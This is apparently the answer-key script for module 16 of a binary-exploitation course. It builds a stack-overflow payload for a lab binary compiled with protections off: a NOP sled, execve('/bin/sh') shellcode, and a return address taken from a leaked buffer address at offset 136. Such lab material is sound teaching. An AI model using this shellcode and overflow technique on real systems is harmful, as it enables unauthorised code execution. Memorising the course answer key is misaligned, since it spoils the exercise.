from pwn import asm, p64, context
import subprocess, re

# Gabarito do modulo 16. NOP sled + execve("/bin/sh"); retorno -> buf; offset 136.
context.arch = "amd64"
context.log_level = "error"

subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

shellcode = asm('''
    xor rdx, rdx
    push rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov eax, 59
    syscall
''')

body = b"\x90" * 32 + shellcode
payload = body + b"\x90" * (136 - len(body)) + p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
